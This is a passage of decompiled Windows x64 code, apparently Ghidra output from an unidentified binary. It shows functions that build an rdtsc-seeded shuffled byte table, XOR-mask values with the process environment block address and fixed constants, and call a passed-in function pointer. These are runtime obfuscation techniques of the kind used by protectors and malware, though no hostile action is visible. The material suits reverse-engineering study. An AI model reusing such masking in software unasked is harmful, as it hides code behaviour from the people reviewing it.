    param_2[0x41] = param_2[0x41] + 1;
  }
  local_78[0] = 3;
  puVar4 = (undefined1 *)param_2[0x41];
  if (puVar4 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar4,local_78);
  }
  else {
    *puVar4 = 3;
    param_2[0x41] = param_2[0x41] + 1;
  }
  FUN_140006110((longlong)param_2,0);
  puVar4 = (undefined1 *)param_2[0x41];
  if (puVar4 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar4,(undefined1 *)param_2);
  }
  else {
    *puVar4 = *(undefined1 *)param_2;
    param_2[0x41] = param_2[0x41] + 1;
  }
  local_78[0] = 6;
  puVar4 = (undefined1 *)param_2[0x41];
  if (puVar4 == (undefined1 *)param_2[0x42]) {
    FUN_14000b6c0(plVar1,puVar4,local_78);
  }
  else {
    *puVar4 = 6;
    param_2[0x41] = param_2[0x41] + 1;
  }
  FUN_140006110((longlong)param_2,0);
  pvVar5 = ProcessEnvironmentBlock;
  if ((*param_1 != 0) && ((int)param_1[1] - 1U < 0xfffe)) {
    local_58 = (undefined8 *)0x0;
    uVar9 = (ulonglong)param_4 ^ (ulonglong)&local_58;
    uVar10 = rdtsc();
    uVar10 = (CONCAT44((int)((ulonglong)&local_58 >> 0x20),(int)uVar10) |
             uVar10 & 0xffffffff00000000) ^ DAT_1400101f8;
    puVar7 = FUN_1400015f0();
    uVar2 = *puVar7;
    puVar7 = FUN_1400015f0();
    uVar3 = puVar7[2];
    *param_6 = (uint)pvVar5 ^ 0x9ea6ed67;
    param_6[1] = (uint)((ulonglong)pvVar5 >> 0x10) ^ (uint)uVar9;
    param_6[2] = (uint)uVar10 ^ uVar2 ^ 0x9ea6ed67;
    param_6[3] = (uint)(uVar10 >> 0x20) ^ uVar3 ^ (uint)(uVar9 >> 8);
    local_58 = (undefined8 *)0x0;
    FUN_1400023d0(param_4,(void *)*param_1,(longlong)(int)param_1[1]);
    FUN_140001810((longlong)param_4,(longlong)(int)param_1[1],(int *)param_6);
    *local_68 = (short)param_1[1];
  }
  return param_1;
}


// ==== FUN_14000d290 @ 14000d290 size 1099

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_14000d290(undefined *param_1,undefined8 param_2,void *param_3,ushort *param_4,uint *param_5
                  )

{
  byte bVar1;
  ushort uVar2;
  code *pcVar3;
  undefined8 uVar4;
  uint *puVar5;
  undefined8 *puVar6;
  byte *pbVar7;
  void *pvVar8;
  uint uVar9;
  longlong lVar10;
  uint uVar11;
  ulonglong uVar12;
  undefined1 auStack_4a8 [32];
  undefined1 local_488 [8];
  undefined8 *local_480;
  byte local_478 [256];
  byte abStack_378 [256];
  undefined8 *local_278 [2];
  undefined1 local_268 [27];
  undefined1 auStack_24d [485];
  void *local_68;
  undefined1 *puStack_60;
  undefined1 *local_58;
  ulonglong local_48;
  
  local_48 = DAT_140010000 ^ (ulonglong)auStack_4a8;
  puVar5 = FUN_1400015f0();
  uVar4 = rdtsc();
  local_480._0_4_ = (uint)uVar4 ^ *puVar5;
  puVar5 = FUN_1400015f0();
  uVar11 = (uint)local_480 ^ puVar5[1];
  puVar5 = FUN_1400015f0();
  local_480 = (undefined8 *)CONCAT44(local_480._4_4_,(uVar11 << 0xd | uVar11 >> 0x13) ^ puVar5[2]);
  puVar6 = (undefined8 *)FUN_14000b890(0x4d0);
  local_480 = puVar6;
  memset(puVar6,0,0x4d0);
  local_278[0] = FUN_140003810(puVar6);
  memset(local_268,0,0x218);
  local_68 = (void *)0x0;
  puStack_60 = (undefined1 *)0x0;
  local_58 = (undefined1 *)0x0;
  uVar4 = rdtsc();
  uVar11 = (uint)uVar4 ^ (uint)local_268 ^ 0xd8e0bc26;
  uVar12 = 0;
  do {
    local_478[uVar12] = (byte)uVar12;
    abStack_378[uVar12] = (byte)uVar12;
    uVar9 = (int)uVar12 + 1;
    uVar12 = (ulonglong)uVar9;
  } while ((int)uVar9 < 0x100);
  uVar12 = 0x1f;
  do {
    uVar11 = uVar11 << 0xd ^ uVar11;
    uVar11 = uVar11 >> 0x11 ^ uVar11;
    uVar11 = uVar11 << 5 ^ uVar11;
    bVar1 = local_478[uVar12];
    local_478[uVar12] = local_478[(int)(uVar11 % ((int)uVar12 + 1U))];
    local_478[(int)(uVar11 % ((int)uVar12 + 1U))] = bVar1;
    uVar9 = (int)uVar12 - 1;
    uVar12 = (ulonglong)uVar9;
  } while (0 < (int)uVar9);
  uVar12 = 0;
  do {
    abStack_378[local_478[uVar12]] = (byte)uVar12;
    uVar11 = (int)uVar12 + 1;
    uVar12 = (ulonglong)uVar11;
  } while ((int)uVar11 < 0x100);
  puVar6 = (undefined8 *)local_268;
  pbVar7 = local_478;
  lVar10 = 4;
  do {
    uVar4 = *(undefined8 *)(pbVar7 + 8);
    *puVar6 = *(undefined8 *)pbVar7;
    puVar6[1] = uVar4;
    uVar4 = *(undefined8 *)(pbVar7 + 0x18);
    puVar6[2] = *(undefined8 *)(pbVar7 + 0x10);
    puVar6[3] = uVar4;
    uVar4 = *(undefined8 *)(pbVar7 + 0x28);
    puVar6[4] = *(undefined8 *)(pbVar7 + 0x20);
    puVar6[5] = uVar4;
    uVar4 = *(undefined8 *)(pbVar7 + 0x38);
    puVar6[6] = *(undefined8 *)(pbVar7 + 0x30);
    puVar6[7] = uVar4;
    uVar4 = *(undefined8 *)(pbVar7 + 0x48);
    puVar6[8] = *(undefined8 *)(pbVar7 + 0x40);
    puVar6[9] = uVar4;
    uVar4 = *(undefined8 *)(pbVar7 + 0x58);
    puVar6[10] = *(undefined8 *)(pbVar7 + 0x50);
    puVar6[0xb] = uVar4;
    uVar4 = *(undefined8 *)(pbVar7 + 0x68);
    puVar6[0xc] = *(undefined8 *)(pbVar7 + 0x60);
    puVar6[0xd] = uVar4;
    uVar4 = *(undefined8 *)(pbVar7 + 0x78);
    puVar6[0xe] = *(undefined8 *)(pbVar7 + 0x70);
    puVar6[0xf] = uVar4;
    puVar6 = puVar6 + 0x10;
    pbVar7 = pbVar7 + 0x80;
    lVar10 = lVar10 + -1;
  } while (lVar10 != 0);
  FUN_14000b6c0((longlong *)&local_68,(void *)0x0,local_268);
  local_488[0] = 3;
  if (puStack_60 == local_58) {
    FUN_14000b6c0((longlong *)&local_68,puStack_60,local_488);
  }
  else {
    *puStack_60 = 3;
    puStack_60 = puStack_60 + 1;
  }
  FUN_140006110((longlong)local_268,0);
  if (puStack_60 == local_58) {
    FUN_14000b6c0((longlong *)&local_68,puStack_60,local_268);
  }
  else {
    *puStack_60 = local_268[0];
    puStack_60 = puStack_60 + 1;
  }
  local_488[0] = 6;
  if (puStack_60 == local_58) {
    FUN_14000b6c0((longlong *)&local_68,puStack_60,local_488);
  }
  else {
    *puStack_60 = 6;
    puStack_60 = puStack_60 + 1;
  }
  FUN_140006110((longlong)local_268,0);
  (*(code *)param_1)(param_2,local_268,local_278);
  if (puStack_60 == local_58) {
    FUN_14000b6c0((longlong *)&local_68,puStack_60,auStack_24d);
  }
  else {
    *puStack_60 = auStack_24d[0];
    puStack_60 = puStack_60 + 1;
  }
  FUN_1400061e0((undefined8 *)local_268,(longlong)local_278[0]);
  puVar6 = local_278[0];
  uVar2 = *param_4;
  if (uVar2 == 0) goto LAB_14000d646;
  pvVar8 = (void *)local_278[0][0x94];
  if (pvVar8 == (void *)0x0) {
    pvVar8 = (void *)FUN_140001a00(0,0x10000);
    puVar6[0x94] = pvVar8;
    if (pvVar8 != (void *)0x0) goto LAB_14000d5e8;
  }
  else {
LAB_14000d5e8:
    uVar4 = rdtsc();
    uVar11 = (uint)uVar4 ^ (uint)puVar6 ^ 0x9ea6ed67;
    *(uint *)((longlong)puVar6 + 0x4bc) = uVar11;
    *(uint *)((longlong)puVar6 + 0x4ac) = uVar11 ^ *param_5;
    *(uint *)(puVar6 + 0x96) = uVar11 ^ param_5[1];
    *(uint *)((longlong)puVar6 + 0x4b4) = uVar11 ^ param_5[2];
    *(uint *)(puVar6 + 0x97) = uVar11 ^ param_5[3];
    FUN_1400023d0(pvVar8,param_3,(ulonglong)uVar2);
    *(ushort *)(puVar6 + 0x95) = uVar2;
  }
  FUN_1400022c0((longlong)param_5,0x10);
LAB_14000d646:
  FUN_140003ea0((longlong)local_278[0]);
  if (local_278[0] != (undefined8 *)0x0) {
    FUN_140006700(local_278[0]);
  }
  FUN_1400022c0((longlong)param_3,0xffff);
  *param_4 = 0;
  if (local_68 != (void *)0x0) {
    pvVar8 = local_68;
    if ((0xfff < (ulonglong)((longlong)local_58 - (longlong)local_68)) &&
       (pvVar8 = *(void **)((longlong)local_68 + -8),
       0x1f < (ulonglong)((longlong)local_68 + (-8 - (longlong)pvVar8)))) {
      pcVar3 = (code *)swi(0x29);
      (*pcVar3)(5);
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    free(pvVar8);
  }
  return;
}


// ==== FUN_14000d6e0 @ 14000d6e0 size 66

void FUN_14000d6e0(void)

{
  ulonglong uVar1;
  
  if (DAT_140010210 == 0) {
    uVar1 = rdtsc();
    DAT_140010208 = uVar1 ^ DAT_1400101f8 ^ 0x140010210;
    DAT_140010210 = uVar1 ^ DAT_1400101f8 ^ 0x1d080;
  }
  return;
}


// ==== FUN_14000d730 @ 14000d730 size 31

ulonglong FUN_14000d730(void)

{
  FUN_14000d6e0();
  return DAT_140010208 ^ DAT_140010210;
}


// ==== FUN_14000d750 @ 14000d750 size 38

void FUN_14000d750(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x28) & 1) != 0) {
    *(uint *)(param_2 + 0x28) = *(uint *)(param_2 + 0x28) & 0xfffffffe;
    FUN_1400037d0(*(longlong **)(param_2 + 0x38));
  }
  return;
}


// ==== FUN_14000d776 @ 14000d776 size 29

void FUN_14000d776(undefined8 param_1,longlong param_2)

{
  free(*(void **)(param_2 + 0x40));
  return;
}


// ==== FUN_14000d7a0 @ 14000d7a0 size 29

void FUN_14000d7a0(undefined8 param_1,longlong param_2)

{
  free(*(void **)(param_2 + 0x28));
  return;
}


